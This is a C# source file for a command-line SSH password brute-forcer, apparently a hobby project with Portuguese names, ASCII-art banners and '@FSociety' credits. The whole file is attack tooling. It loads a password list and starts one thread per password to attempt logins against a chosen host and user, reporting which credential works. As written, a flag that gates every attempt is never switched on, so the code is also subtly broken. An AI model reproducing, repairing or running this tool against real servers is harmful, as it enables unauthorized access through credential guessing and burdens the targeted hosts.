using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using Renci.SshNet;
using System.IO;
namespace sshell
{
    class Program
    {
        static string[] Logos = { @"
███████╗███████╗██╗  ██╗    ██╗  ██╗███████╗██╗     ██╗          ██╗    ██████╗ 
██╔════╝██╔════╝██║  ██║    ██║  ██║██╔════╝██║     ██║         ███║   ██╔═████╗
███████╗███████╗███████║    ███████║█████╗  ██║     ██║         ╚██║   ██║██╔██║
╚════██║╚════██║██╔══██║    ██╔══██║██╔══╝  ██║     ██║          ██║   ████╔╝██║
███████║███████║██║  ██║    ██║  ██║███████╗███████╗███████╗     ██║██╗╚██████╔╝
╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝     ╚═╝╚═╝ ╚═════╝                                                                  
", @"
                           .::     .::           .:: .::                         
              .::          .::     .::           .:: .::     .::         .::     
 .::::  .:::: .::          .::     .::   .::     .:: .::      .::      .::  .::  
.::    .::    .: .:        .:::::: .:: .:   .::  .:: .::      .::    .::     .:: 
  .:::   .::: .::  .::     .::     .::.::::: .:: .:: .::      .::    .::      .::
    .::    .::.:   .::     .::     .::.:         .:: .::      .::     .::    .:: 
.:: .::.:: .::.::  .::     .::     .::  .::::   .:::.:::     .::::.::   .:::                                                                   

", @"
                        #     #                            #         ###   
 ####   ####  #    #    #     # ###### #      #           ##        #   #  
#      #      #    #    #     # #      #      #          # #       #     # 
 ####   ####  ######    ####### #####  #      #            #       #     # 
     #      # #    #    #     # #      #      #            #   ### #     # 
#    # #    # #    #    #     # #      #      #            #   ###  #   #  
 ####   ####  #    #    #     # ###### ###### ######     ##### ###   ###
", @"
                                  
                                                
        .         .   .     . .        .    .-. 
        |         |   |     | |      .'|   :   :
.--..--.|--.      |---| .-. | |        |   |   |
`--.`--.|  |      |   |(.-' | |        |   :   ;
`--'`--''  `-     '   ' `--'`-`-     '---'o `-' 
                                                

",
 @"
  _____  _____ __ __      __ __    ___  _      _             
 / ___/ / ___/|  |  |    |  |  |  /  _]| |    | |            
(   \_ (   \_ |  |  |    |  |  | /  [_ | |    | |            
 \__  | \__  ||  _  |    |  _  ||    _]| |___ | |___         
 /  \ | /  \ ||  |  |    |  |  ||   [_ |     ||     |     __ 
 \    | \    ||  |  |    |  |  ||     ||     ||     |    |  |
  \___|  \___||__|__|    |__|__||_____||_____||_____|    |__|
                                                             

"
                               };
        static string Creditos = @"
                        @gusdnide
                        @Microsoft
                        @FSociety            
";

        static void Escrever(string str, ConsoleColor cor = ConsoleColor.White)
        {
            int Count = str.Count();
            ConsoleColor cBackup = Console.ForegroundColor;
            Console.ForegroundColor = cor;
            for (int i = 0; i < Count; i++)
            {
                Console.Write(str[i]);
                Thread.Sleep(1);
            }
            Console.WriteLine("");
            Console.ForegroundColor = cBackup;
        }
        static bool Testando = false;
        static void Logar(string Usuario, string Senha, string Host, int Port)
        {
            if (Testando == true)
            {

                try
                {
                    SshClient cSSH = new SshClient(Host, Port, Usuario, Senha);
                    cSSH.Connect();
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[ * ] Login: " + Usuario + " Senha: " + Senha + " Correto!");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Testando = false;
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[ * ] Login: " + Usuario + " Senha: " + Senha + " Incorreto!");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    return;
                }

            }


        }
        static void CriarThreadLogar(string Usuario, string Senha, string Host, int Port)
        {
            Thread tr = new Thread(() => Logar(Usuario, Senha, Host, Port));
            tr.Start();
        }
        static void VerificarWord(string ArquivoSenha, string Usuario, string Host, string Port)
        {
            try
            {
                string[] Senhas = File.ReadAllLines(ArquivoSenha);
                Escrever(Senhas.Count() + " Senhas carregadas!");
                for (int i = 0; i < Senhas.Count(); i++)
                {
                    if (Testando == true)
                    {
                        CriarThreadLogar(Usuario, Senhas[i], Host, int.Parse(Port));
                    }                   
                }
            }
            catch (Exception ex)
            {
               Escrever("Falha ao carregar Arquivo de Senhas!", ConsoleColor.Red);
               Environment.Exit(0);
            }
        }
        static void CriarThreadWord(string Usuario, string ArquivoSenha, string Host, string Port)
        {
            Thread t = new Thread(() => VerificarWord(ArquivoSenha, Usuario, Host, Port));
            t.Start();
        }
        static void Main(string[] args)
        {
            Random r = new Random();
            Console.WindowWidth = 100;
            Escrever(Logos[r.Next(0, Logos.Count() - 1)], ConsoleColor.Green);
            Escrever(Creditos, ConsoleColor.White);
            try
            {
                string Host = args[0];
                string Porta = args[1];
                string Usuario = args[2];
                string ArquivoSenha = args[3];
                if (Host == "" || Porta == "" || Usuario == "" || ArquivoSenha == "")
                {
                    Escrever("Esta faltando Argumentos!");
                    Escrever("sshell.exe <host> <port> <usuario> <ArquivoSenha>");
                    Environment.Exit(0);
                }
                CriarThreadWord(Usuario, ArquivoSenha, Host, Porta);
            }
            catch (Exception ex)
            {
                Escrever("Ocorreu algum error ou Esta faltando Argumentos!");
                Escrever("sshell.exe <host> <port> <usuario> <ArquivoSenha>");
                Environment.Exit(0);
            }

        }



    }
}
